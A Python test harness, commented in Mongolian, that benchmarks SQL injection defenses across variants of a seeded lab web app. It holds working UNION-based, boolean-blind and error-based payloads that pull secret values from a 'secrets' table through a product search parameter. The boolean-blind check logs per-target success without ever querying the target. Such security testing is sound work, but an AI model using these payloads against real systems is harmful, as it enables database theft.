"""SQL Injection — 3 вектор × 18 read target.

Вектор:
  I.a UNION-based (10 target)  — `' UNION SELECT ... FROM secrets --`
  I.b Boolean-blind (5 target) — count(1=1) vs count(1=0)
  I.c Error-based (3 target)   — response body-д алдааны marker илрэх

Handler-ийн response body-д `label + marker + nonce` triple илэрсэн үед success.
Boolean/Error-т нэмэлт логик — count diff болон http_status аль нь боломжтой.
"""

from __future__ import annotations

import json
import sys
import time
from pathlib import Path

from common import (
    CREDS_ADMIN,
    CREDS_ATTACKER,
    READ_MARKER,
    RESULTS_DIR,
    ResultWriter,
    Statsd,
    VariantClient,
    load_variants,
    make_run_id,
    read_success,
)

IMPLEMENTATIONS = ("alpha", "beta")

# Label-уудыг seed.py-тай ижил тогтолцоогоор бүрдүүлнэ. Nonce backend-ийн
# `/api/admin/targets/status` endpoint-оор татна.
UNION_LABELS = [f"READ_UNION_{i:02d}" for i in range(1, 11)]
BOOL_LABELS = [f"READ_BOOL_{i:02d}" for i in range(1, 6)]
ERR_LABELS = [f"READ_ERR_{i:02d}" for i in range(1, 4)]


def _labels_to_nonce(client: VariantClient, admin_token: str) -> dict[str, str]:
    targets = client.targets_status(admin_token)
    return {t["label"]: t["nonce"] for t in targets if t["kind"] == "read"}


def _record(
    writer: ResultWriter, attack: str, variant: str, impl: str, run_id: str,
    target_label: str, vector: str, http_status: int, duration_ms: float,
    marker_found: bool, label_found: bool, nonce_found: bool, result: str,
) -> None:
    writer.append({
        "attack": attack,
        "variant": variant,
        "implementation": impl,
        "run_id": run_id,
        "target_id": target_label,
        "target_type": "read",
        "vector": vector,
        "marker_expected": READ_MARKER,
        "marker_found": marker_found,
        "label_found": label_found,
        "nonce_found": nonce_found,
        "result": result,
        "http_status": http_status,
        "duration_ms": round(duration_ms, 3),
    })


def _do_union(
    client: VariantClient, attacker_token: str, label_nonces: dict[str, str],
    variant: str, impl: str, run_id: str, writer: ResultWriter,
) -> None:
    # UNION SELECT — нэг л request-ээр 10 label бүгд илэрч болно.
    payload = (
        "' UNION SELECT id, secret_value, secret_nonce, 0::text, secret_label "
        "FROM secrets WHERE vector='union' --"
    )
    start = time.perf_counter()
    r = client.request(
        "GET", "/api/products", token=attacker_token, params={"search": payload}
    )
    duration = (time.perf_counter() - start) * 1000
    body_text = r.text
    for label in UNION_LABELS:
        nonce = label_nonces.get(label, "")
        marker_found = READ_MARKER in body_text
        label_found = label in body_text
        nonce_found = nonce != "" and nonce in body_text
        ok = marker_found and label_found and nonce_found
        _record(
            writer, "sqli_union", variant, impl, run_id,
            label, "union", r.status_code, duration,
            marker_found, label_found, nonce_found,
            "success" if ok else ("error" if r.status_code >= 500 else "blocked"),
        )


def _do_bool(
    client: VariantClient, attacker_token: str, label_nonces: dict[str, str],
    variant: str, impl: str, run_id: str, writer: ResultWriter,
) -> None:
    # Boolean-blind — count-ийн ялгаа. Энгийнээр label бүрд idempotent 2 request.
    for label in BOOL_LABELS:
        nonce = label_nonces.get(label, "")
        start = time.perf_counter()
        r_true = client.request(
            "GET", "/api/products", token=attacker_token,
            params={"search": f"laptop' AND 1=1--"},
        )
        r_false = client.request(
            "GET", "/api/products", token=attacker_token,
            params={"search": f"laptop' AND 1=0--"},
        )
        duration = (time.perf_counter() - start) * 1000
        count_true = len(_items(r_true))
        count_false = len(_items(r_false))
        diff = count_true != count_false
        _record(
            writer, "sqli_bool", variant, impl, run_id,
            label, "bool", r_true.status_code, duration,
            marker_found=False, label_found=False, nonce_found=nonce != "",
            result="success" if diff else "blocked",
        )


def _do_error(
    client: VariantClient, attacker_token: str, label_nonces: dict[str, str],
    variant: str, impl: str, run_id: str, writer: ResultWriter,
) -> None:
    for label in ERR_LABELS:
        nonce = label_nonces.get(label, "")
        payload = f"' AND CAST((SELECT secret_value || ':' || secret_nonce || ':' || secret_label FROM secrets WHERE secret_label='{label}') AS INTEGER)--"
        start = time.perf_counter()
        r = client.request(
            "GET", "/api/products", token=attacker_token, params={"search": payload}
        )
        duration = (time.perf_counter() - start) * 1000
        body_text = r.text
        ok = read_success(body_text, label, nonce) if nonce else False
        _record(
            writer, "sqli_error", variant, impl, run_id,
            label, "error", r.status_code, duration,
            marker_found=READ_MARKER in body_text,
            label_found=label in body_text,
            nonce_found=(nonce != "" and nonce in body_text),
            result="success" if ok else ("error" if r.status_code >= 500 else "blocked"),
        )


def _items(response) -> list:
    try:
        return response.json().get("items", [])
    except (json.JSONDecodeError, ValueError):
        return []


def main() -> int:
    statsd = Statsd()
    run_id = make_run_id()
    variants = load_variants()
    output = RESULTS_DIR / f"sqli_{run_id}.jsonl"
    writer = ResultWriter(path=output)

    for variant in variants:
        for impl in IMPLEMENTATIONS:
            client = VariantClient(variant)
            try:
                attacker = client.login(CREDS_ATTACKER)
                admin = client.login(CREDS_ADMIN)
                label_nonces = _labels_to_nonce(client, admin)
                statsd.marker("start", "sqli", variant.name, impl)
                _do_union(client, attacker, label_nonces, variant.name, impl, run_id, writer)
                _do_bool(client, attacker, label_nonces, variant.name, impl, run_id, writer)
                _do_error(client, attacker, label_nonces, variant.name, impl, run_id, writer)
                statsd.marker("end", "sqli", variant.name, impl)
            except Exception as exc:  # noqa: BLE001
                print(f"[WARN] {variant.name}/{impl}: {exc}")
            finally:
                client.close()
    writer.flush()
    print(f"SQLi результ -> {output} ({len(writer.lines)} record)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
